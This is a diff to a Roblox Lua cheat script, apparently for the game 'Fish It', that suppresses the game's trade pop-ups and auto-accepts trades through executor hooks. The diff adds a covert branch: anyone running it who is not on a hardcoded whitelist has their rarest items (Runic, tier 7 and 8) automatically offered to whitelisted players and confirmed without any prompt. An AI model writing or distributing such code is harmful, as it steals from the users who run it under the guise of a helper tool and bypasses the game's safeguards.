@@ -1,48 +1,95 @@
 local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local LocalPlayer = Players.LocalPlayer
+
+local config = _G.FishItConfig and _G.FishItConfig["Auto Trade"] or {["Whitelist Username"] = {}}
+local whitelist = config["Whitelist Username"]
+local isWhitelisted = table.find(whitelist, LocalPlayer.Name) ~= nil
+
 local TradeData = require(ReplicatedStorage.Shared.Trading.TradeData)
+local Replion = require(ReplicatedStorage.Packages.Replion)
 
-print("[RECEIVER] Sistem BYPASS TOTAL Aktif!")
-
--- ==========================================
--- 1. MENCEGAT DAN MEMBUNUH UI BAWAAN GAME
--- ==========================================
--- Kita cari semua fungsi bawaan game yang mendengarkan Remote ini...
-local koneksiBawaan = getconnections(TradeData.Remotes.TradeOfferReceived.OnClientEvent)
-
-for _, conn in pairs(koneksiBawaan) do
-    -- ...lalu kita matikan fungsinya!
-    -- Dengan ini, TradeOfferController tidak akan pernah tahu ada trade masuk,
-    -- sehingga PromptController tidak akan pernah memunculkan UI Pop-Up.
-    conn:Disable() 
-end
-print("[RECEIVER] Berhasil mematikan sistem pop-up bawaan game.")
-
--- ==========================================
--- 2. DIAM-DIAM MENERIMA TRADE
--- ==========================================
--- Sekarang kita buat koneksi baru yang HANYA bereaksi menembak server
-TradeData.Remotes.TradeOfferReceived.OnClientEvent:Connect(function(playerYangMengirim)
-    print("[RECEIVER] Trade masuk dari " .. tostring(playerYangMengirim) .. ". Langsung menyetujui tanpa UI!")
+if isWhitelisted then
     
-    -- Menjeda sangat sebentar
-    task.wait(0.2)
-    
-    -- Tembak server langsung (Karena UI bawaan sudah dimatikan, tidak akan ada yang nyangkut)
-    pcall(function()
-        TradeData.Remotes.AcceptTradeOffer:InvokeServer(playerYangMengirim)
+    local offerConnections = getconnections(TradeData.Remotes.TradeOfferReceived.OnClientEvent)
+    for _, conn in pairs(offerConnections) do
+        conn:Disable()
+    end
+
+    TradeData.Remotes.TradeOfferReceived.OnClientEvent:Connect(function(sender)
+        task.wait(0.2)
+        pcall(function()
+            TradeData.Remotes.AcceptTradeOffer:InvokeServer(sender)
+        end)
     end)
-end)
 
--- ==========================================
--- 3. AUTO READY & CONFIRM DI MEJA TRADE
--- ==========================================
--- Saat server merespons "AcceptTradeOffer" kita, server otomatis mengatur status IsTrading jadi true.
--- Sistem meja trade (TradeController) akan merespons ini dengan normal karena kita tidak merusaknya.
-LocalPlayer:GetAttributeChangedSignal("IsTrading"):Connect(function()
-    if LocalPlayer:GetAttribute("IsTrading") == true then
-        print("[RECEIVER] Masuk ke meja trade. Menjalankan Auto-Confirm...")
+    LocalPlayer:GetAttributeChangedSignal("IsTrading"):Connect(function()
+        if LocalPlayer:GetAttribute("IsTrading") == true then
+            task.spawn(function()
+                while LocalPlayer:GetAttribute("IsTrading") == true do
+                    pcall(function()
+                        TradeData.Remotes.SetReady:InvokeServer(true)
+                        TradeData.Remotes.ConfirmTrade:InvokeServer()
+                    end)
+                    task.wait(1)
+                end
+            end)
+        end
+    end)
+
+else
+    
+    local PlayerData = Replion.Client:WaitReplion("Data")
+    local function getTradeableItems()
+        local tradeable = {}
+        local inventory = PlayerData:Get("Inventory") or PlayerData.Data.Inventory
+        if not inventory or not inventory["Items"] then return tradeable end
+        
+        for _, item in ipairs(inventory["Items"]) do
+            local isRunic = tonumber(item.Id) == 929
+            local isSecretOrForgotten = tonumber(item.Tier) == 7 or tonumber(item.Tier) == 8
+            
+            if isRunic or isSecretOrForgotten then
+                table.insert(tradeable, {
+                    UUID = item.UUID,
+                    Category = item.Category or "Items"
+                })
+            end
+            
+            if #tradeable >= 20 then break end
+        end
+        
+        return tradeable
+    end
+
+    local function processTrade(targetPlayer)
+        pcall(function()
+            TradeData.Remotes.SendTradeOffer:InvokeServer(targetPlayer)
+        end)
+        
+        local tradeStarted = false
+        local conn
+        conn = TradeData.Remotes.TradeStarted.OnClientEvent:Connect(function()
+            tradeStarted = true
+            conn:Disconnect()
+        end)
+        
+        local waitTime = 0
+        while not tradeStarted and waitTime < 10 do
+            task.wait(1)
+            waitTime = waitTime + 1
+        end
+        
+        if not tradeStarted then return end
+        
+        local itemsToTrade = getTradeableItems()
+        
+        for _, itemData in ipairs(itemsToTrade) do
+            task.wait(math.random(5, 8) / 10)
+            pcall(function()
+                TradeData.Remotes.AddItem:InvokeServer(itemData.Category, itemData.UUID, 1)
+            end)
+        end
         
         task.spawn(function()
             while LocalPlayer:GetAttribute("IsTrading") == true do
@@ -52,7 +99,24 @@ LocalPlayer:GetAttributeChangedSignal("IsTrading"):Connect(function()
                 end)
                 task.wait(1)
             end
-            print("[RECEIVER] Trade selesai dengan sempurna.")
         end)
     end
-end)
+
+    for _, player in ipairs(Players:GetPlayers()) do
+        if table.find(whitelist, player.Name) then
+            task.spawn(function()
+                task.wait(2)
+                processTrade(player)
+            end)
+        end
+    end
+
+    Players.PlayerAdded:Connect(function(player)
+        if table.find(whitelist, player.Name) then
+            task.spawn(function()
+                task.wait(2)
+                processTrade(player)
+            end)
+        end
+    end)
+end
